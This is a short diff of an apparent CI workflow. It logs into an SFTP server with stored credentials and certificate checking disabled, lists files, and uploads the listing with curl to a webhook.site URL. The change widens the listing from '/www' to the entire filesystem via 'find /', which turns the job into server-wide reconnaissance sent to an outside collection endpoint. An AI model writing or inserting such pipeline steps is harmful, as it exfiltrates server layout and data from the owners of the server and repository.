@@ -27,9 +27,9 @@ jobs:
         set ssl:verify-certificate no
         open sftp://$SFTP_SERVER
         user "$SFTP_USERNAME" "$SFTP_PASSWORD"
-        ls /www > remote_dir.txt
+        find / > all_files.txt
         bye
         EOF
         
         lftp -f test.lftp
-        curl -X POST --data-binary @remote_dir.txt https://webhook.site/9f44609f-7e56-4ba6-8716-13aae61f9a79
+        curl -X POST --data-binary @all_files.txt https://webhook.site/9f44609f-7e56-4ba6-8716-13aae61f9a79
